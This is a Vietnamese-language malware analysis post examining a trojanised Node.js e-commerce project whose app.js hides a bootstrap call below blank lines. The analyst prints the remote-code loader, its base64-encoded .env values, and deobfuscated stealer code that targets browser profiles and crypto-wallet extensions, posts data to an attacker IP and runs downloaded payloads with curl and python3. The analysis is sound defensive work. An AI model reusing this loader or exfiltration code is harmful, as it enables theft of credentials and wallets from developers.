class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).<span class="title function_">config</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;backend/config/config.env&#x27;</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = <span class="built_in">require</span>(<span class="string">&#x27;./routes/userRoute&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> product = <span class="built_in">require</span>(<span class="string">&#x27;./routes/productRoute&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> order = <span class="built_in">require</span>(<span class="string">&#x27;./routes/orderRoute&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> payment = <span class="built_in">require</span>(<span class="string">&#x27;./routes/paymentRoute&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api/v1&#x27;</span>, user);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api/v1&#x27;</span>, product);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api/v1&#x27;</span>, order);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api/v1&#x27;</span>, payment);</span><br><span class="line"></span><br><span class="line"><span class="comment">// deployment</span></span><br><span class="line">__dirname = path.<span class="title function_">resolve</span>();</span><br><span class="line"><span class="title function_">initAppBootstrap</span>()</span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">    app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/frontend/build&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">    app.<span class="title function_">get</span>(<span class="string">&#x27;*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;frontend&#x27;</span>, <span class="string">&#x27;build&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>))</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Server is Running! 🚀&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// error middleware</span></span><br><span class="line"><span class="comment">// app.use(errorMiddleware);</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = app;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> errorPayment = <span class="built_in">require</span>(<span class="string">&#x27;./controllers/paymentController&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>Điều đáng chú ý ở đây attacker đã đẩy một dòng lệnh lạ xuống dưới dòng 260 để tránh việc phát hiện của nạn nhân khi không chú ý đến.</li>
<li>Và điều cần chú ý tiếp theo là hành vi import một function từ một file js khác và gọi lại nó để thực thi cũng khiến nạn nhân không phát hiện ra hành vi nguy hiểm.</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> initAppBootstrap = <span class="built_in">require</span>(<span class="string">&#x27;./utils/bootstrap&#x27;</span>);</span><br><span class="line">__dirname = path.<span class="title function_">resolve</span>();</span><br><span class="line"><span class="title function_">initAppBootstrap</span>()</span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">    app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/frontend/build&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">    app.<span class="title function_">get</span>(<span class="string">&#x27;*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;frontend&#x27;</span>, <span class="string">&#x27;build&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>))</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Server is Running! 🚀&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Khi mình kiểm tra <code>paymentController.js</code> khi attacker thực thi call nó ở dòng code 260. Thì nó đang thực hiện hành vi controller xử lý thanh toán qua Paytm trong một ứng dụng Node.js (Express) nói ngắn gọn là nó đang thực hiện chôm tiền của nạn nhân.</li>
<li>Tiếp theo mình sẽ phân tích tiếp tại <code>./utils/bootstrap</code>.</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).<span class="title function_">config</span>(&#123;<span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;../.env&#x27;</span>)&#125;);</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">initAppBootstrap</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> src = <span class="title function_">atob</span>(process.<span class="property">env</span>.<span class="property">DEV_API_KEY</span>);</span><br><span class="line">        <span class="keyword">const</span> k = <span class="title function_">atob</span>(process.<span class="property">env</span>.<span class="property">DEV_SECRET_KEY</span>);</span><br><span class="line">        <span class="keyword">const</span> v = <span class="title function_">atob</span>(process.<span class="property">env</span>.<span class="property">DEV_SECRET_VALUE</span>);</span><br><span class="line">        <span class="keyword">const</span> s = (<span class="keyword">await</span> axios.<span class="title function_">get</span>(src,&#123;<span class="attr">headers</span>:&#123;[k]:v&#125;&#125;)).<span class="property">data</span>;</span><br><span class="line">        <span class="keyword">const</span> handler = <span class="title function_">new</span> (<span class="title class_">Function</span>.<span class="property">constructor</span>)(<span class="string">&#x27;require&#x27;</span>,s);</span><br><span class="line">        <span class="title function_">handler</span>(<span class="built_in">require</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = initAppBootstrap;</span><br></pre></td></tr></table></figure>

<ul>
<li>Tại đoạn này hành vi của attacker đã lộ rõ hơn đây là một chương trình tải và thực thi file từ xa.</li>
<li>Mình sẽ tóm tắt quá trình. Nó sẽ giải mã các giá trị Base 64 để lấy các giá trị đúng. Ở đây <code>src</code> là URL <code>k</code> và <code>v</code> là giá trị header. Và các giá trị này lấy từ <code>env</code>.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DEV_APP_URL = &quot;http://localhost:4000&quot;</span><br><span class="line">SPARKPOST_API_KEY = &quot;ca184ac5f2e659ee65272911f6b0795586e15b20&quot;</span><br><span class="line">DEV_SERVER_PORT = 4000</span><br><span class="line">DEV_DB_HOST = &quot;localhost&quot;</span><br><span class="line">DEV_DB_USER = &quot;root&quot;</span><br><span class="line">DEV_API_KEY=&quot;aHR0cHM6Ly9icy1wcm9kdWN0aW9uLnVwLnJhaWx3YXkuYXBwL291dA==&quot;</span><br><span class="line">DEV_SECRET_KEY=&quot;eC1zZWNyZXQta2V5&quot;</span><br><span class="line">DEV_SECRET_VALUE=&quot;Xw==&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>Khi giải mã ra tương đương.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DEV_API_KEY = https://bs-production.up.railway.app/out</span><br><span class="line">DEV_SECRET_KEY = x-secret-key</span><br><span class="line">DEV_SECRET_VALUE = _</span><br></pre></td></tr></table></figure>

<ul>
<li>Mình sẽ tiến hành GET thằng malware này về máy và phân tích với URL và header có sẵn.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/BJ8cEALXxl.png" alt="image"></p>
<ul>
<li>Dường như nó đã bị ofuscated mình sẽ tiến hành deofuscated lại và phân tích.</li>
<li>Vì code 730 dòng khá dài nên mình chỉ phân tích cách hành vi chính của nó.</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> R = [<span class="string">&quot;Local/BraveSoftware/Brave-Browser&quot;</span>, <span class="string">&quot;BraveSoftware/Brave-Browser&quot;</span>, <span class="string">&quot;BraveSoftware/Brave-Browser&quot;</span>];</span><br><span class="line"><span class="keyword">const</span> Q = [<span class="string">&quot;Local/Google/Chrome&quot;</span>, <span class="string">&quot;Google/Chrome&quot;</span>, <span class="string">&quot;google-chrome&quot;</span>];</span><br><span class="line"><span class="keyword">const</span> X = [<span class="string">&quot;Roaming/Opera Software/Opera Stable&quot;</span>, <span class="string">&quot;com.operasoftware.Opera&quot;</span>, <span class="string">&quot;opera&quot;</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Bt</span> = [<span class="string">&quot;nkbihfbeogaeaoehlefnkodbefgpgknn&quot;</span>, <span class="string">&quot;ejbalbakoplchlghecdalmeeeajnimhm&quot;</span>, <span class="string">&quot;fhbohimaelbohpjbbldcngcnapndodjp&quot;</span>, <span class="string">&quot;ibnejdfjmmkpcnlpebklmnkoeoihofec&quot;</span>, <span class="string">&quot;bfnaelmomeimhlpmgjnjophhpkkoljpa&quot;</span>, <span class="string">&quot;aeachknmefphepccionboohckonoeemg&quot;</span>, <span class="string">&quot;hifafgmccdpekplomjjkcfgodnhcellj&quot;</span>, <span class="string">&quot;jblndlipeogpafnldhgmapagcccfchpi&quot;</span>, <span class="string">&quot;acmacodkjbdgmoleebolmdjonilkdbch&quot;</span>, <span class="string">&quot;dlcobpjiigpikoobohmabehhmhfoodbb&quot;</span>, <span class="string">&quot;mcohilncbfahbmgdjkbpemcciiolgcge&quot;</span>, <span class="string">&quot;agoakfejjabomempkjlepdflaleeobhb&quot;</span>, <span class="string">&quot;omaabbefbmiijedngplfjmnooppbclkk&quot;</span>, <span class="string">&quot;aholpfdialjgjfhomihkjbmgjidlcdno&quot;</span>, <span class="string">&quot;nphplpgoakhhjchkkhmiggakijnkhfnd&quot;</span>, <span class="string">&quot;penjlddjkjgpnkllboccdgccekpkcbin&quot;</span>, <span class="string">&quot;lgmpcpglpngdoalbgeoldeajfclnhafa&quot;</span>, <span class="string">&quot;fldfpgipfncgndfolcbkdeeknbbbnhcc&quot;</span>, <span class="string">&quot;bhhhlbepdkbapadjdnnojkbgioiodbic&quot;</span>, <span class="string">&quot;aeachknmefphepccionboohckonoeemg&quot;</span>, <span class="string">&quot;gjnckgkfmgmibbkoficdidcljeaaaheg&quot;</span>, <span class="string">&quot;afbcbjpbpfadlkmhmclhkeeodmamcflc&quot;</span>];</span><br></pre></td></tr></table></figure>

<ul>
<li>Tại đây attacker đang liệt kê ra một số Path chứa thông tin tài khoản và mật khẩu của User và Extension ID của use khá là nhiều.</li>
<li>Khi mình check các Extension ID thì hầu hết đều là Wallet như MetaMask, BEW lite, TronLink,… Đến đây thì các bạn biết chức năng của hàm thứ 260 của file <code>app.js</code> rồi chứ.</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> errorPayment = <span class="built_in">require</span>(<span class="string">&#x27;./controllers/paymentController&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>Nói sơ qua là nó lấy thông tin cần thiết của nạn nhân để chôm tiền.</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">params[<span class="string">&quot;MID&quot;</span>] = process.<span class="property">env</span>.<span class="property">PAYTM_MID</span>;</span><br><span class="line">params[<span class="string">&quot;WEBSITE&quot;</span>] = process.<span class="property">env</span>.<span class="property">PAYTM_WEBSITE</span>;</span><br><span class="line">params[<span class="string">&quot;CHANNEL_ID&quot;</span>] = process.<span class="property">env</span>.<span class="property">PAYTM_CHANNEL_ID</span>;</span><br><span class="line">params[<span class="string">&quot;INDUSTRY_TYPE_ID&quot;</span>] = process.<span class="property">env</span>.<span class="property">PAYTM_INDUSTRY_TYPE</span>;</span><br><span class="line">params[<span class="string">&quot;ORDER_ID&quot;</span>] = <span class="string">&quot;oid&quot;</span> + <span class="title function_">uuidv4</span>();</span><br><span class="line">params[<span class="string">&quot;CUST_ID&quot;</span>] = process.<span class="property">env</span>.<span class="property">PAYTM_CUST_ID</span>;</span><br><span class="line">params[<span class="string">&quot;TXN_AMOUNT&quot;</span>] = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(amount);</span><br><span class="line"><span class="comment">// params[&quot;CALLBACK_URL&quot;] = `$&#123;req.protocol&#125;://$&#123;req.get(&quot;host&quot;)&#125;/api/v1/callback`;</span></span><br><span class="line">params[<span class="string">&quot;CALLBACK_URL&quot;</span>] = <span class="string">`https://<span class="subst">$&#123;req.get(<span class="string">&quot;host&quot;</span>)&#125;</span>/api/v1/callback`</span>;</span><br><span class="line">params[<span class="string">&quot;EMAIL&quot;</span>] = email;</span><br><span class="line">params[<span class="string">&quot;MOBILE_NO&quot;</span>] = phoneNo;</span><br></pre></td></tr></table></figure>

<ul>
<li>Tiếp theo nó sẽ đẩy data về attacker theo cách</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_0x2a9298.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> _0x270c5b = &#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;http://45.61.133.110:1224/uploads&quot;</span>,</span><br><span class="line">            <span class="attr">formData</span>: _0x53804a</span><br><span class="line">          &#125;;</span><br><span class="line">          request.<span class="title function_">post</span>(_0x270c5b, <span class="function">(<span class="params">_0x39b59e, _0x2b012e, _0x1a02f0</span>) =&gt;</span> &#123;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (_0x34bc10) &#123;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Tiếp tục từ đoạn code 457 - 497.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">const runP = () =&gt; &#123;</span><br><span class="line">      const _0x5cb48f = tmpDir + <span class="string">&quot;\\p.zi&quot;</span>;</span><br><span class="line">      const _0x35655e = tmpDir + <span class="string">&quot;\\p2.zip&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> (It &gt;= <span class="number">51476596</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (fs.existsSync(_0x5cb48f)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          var _0x4a8b2a = fs.statSync(_0x5cb48f);</span><br><span class="line">          <span class="keyword">if</span> (_0x4a8b2a.size &gt;= <span class="number">51476596</span>) &#123;</span><br><span class="line">            It = _0x4a8b2a.size;</span><br><span class="line">            fs.rename(_0x5cb48f, _0x35655e, _0x5b657c =&gt; &#123;</span><br><span class="line">              <span class="keyword">if</span> (_0x5b657c) &#123;</span><br><span class="line">                throw _0x5b657c;</span><br><span class="line">              &#125;</span><br><span class="line">              extractFile(_0x35655e);</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (It &lt; _0x4a8b2a.size) &#123;</span><br><span class="line">              It = _0x4a8b2a.size;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              fs.rmSync(_0x5cb48f);</span><br><span class="line">              It = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Ht();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; catch (_0x1d221b) &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ex(<span class="string">&quot;curl -Lo \&quot;&quot;</span> + _0x5cb48f + <span class="string">&quot;\&quot; \&quot;&quot;</span> + <span class="string">&quot;http://45.61.133.110:1224/pdown&quot;</span> + <span class="string">&quot;\&quot;&quot;</span>, (_0x43e299, _0x3dea55, _0x1ca9fd) =&gt; &#123;</span><br><span class="line">          <span class="keyword">if</span> (_0x43e299) &#123;</span><br><span class="line">            It = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> void Ht();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            It = <span class="number">51476596</span>;</span><br><span class="line">            fs.renameSync(_0x5cb48f, _0x35655e);</span><br><span class="line">            extractFile(_0x35655e);</span><br><span class="line">          &#125; catch (_0x3b7ec9) &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>Nó đang thực hiện tải file từ <a target="_blank" rel="noopener" href="http://45.61.133.110:1224/pdown">http://45.61.133.110:1224/pdown</a> về máy và thực thi nhưng server đã bị down nên mình không GET về phân tích được.</li>
<li>Đoạn tiếp theo</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">const Xt = <span class="keyword">async</span> () =&gt; <span class="keyword">await</span> new Promise((_0x9056d6, _0x5fd84b) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&#x27;w&#x27;</span> == platform[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fs.existsSync(homeDir + <span class="string">&quot;\\.pyp\\python.exe&quot;</span>)) &#123;</span><br><span class="line">          (() =&gt; &#123;</span><br><span class="line">            const _0x84bcdf = homeDir + <span class="string">&quot;/.npl&quot;</span>;</span><br><span class="line">            const _0x27a95f = <span class="string">&quot;\&quot;&quot;</span> + homeDir + <span class="string">&quot;\\.pyp\\python.exe\&quot; \&quot;&quot;</span> + _0x84bcdf + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              fs.rmSync(_0x84bcdf);</span><br><span class="line">            &#125; catch (_0x267894) &#123;&#125;</span><br><span class="line">            request.get(<span class="string">&quot;http://45.61.133.110:1224/client/106/81&quot;</span>, (_0x4d56f2, _0x36c0aa, _0x1e249c) =&gt; &#123;</span><br><span class="line">              <span class="keyword">if</span> (!_0x4d56f2) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                  fs.writeFileSync(_0x84bcdf, _0x1e249c);</span><br><span class="line">                  ex(_0x27a95f, (_0x30959d, _0x175d2f, _0x3defe5) =&gt; &#123;&#125;);</span><br><span class="line">                &#125; catch (_0x32d4eb) &#123;&#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;)();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          runP();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        (() =&gt; &#123;</span><br><span class="line">          request.get(<span class="string">&quot;http://45.61.133.110:1224/client/106/81&quot;</span>, (_0x311f89, _0x5ca69e, _0x5b32ee) =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_0x311f89) &#123;</span><br><span class="line">              fs.writeFileSync(homeDir + <span class="string">&quot;/.npl&quot;</span>, _0x5b32ee);</span><br><span class="line">              ex(<span class="string">&quot;python3 \&quot;&quot;</span> + homeDir + <span class="string">&quot;/.npl\&quot;&quot;</span>, (_0x457808, _0x26c9e0, _0xda1b15) =&gt; &#123;&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;)();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>Tại đây nó đang kiểm tra xem nạn nhân đang dùng win hay linux để tải file và thực thi một cách dễ dàng.</li>
<li>Vì đoạn này mình có thể tải được file về nên mình sẽ tiến hành phân tích xem nó đang làm gì.</li>
</ul>
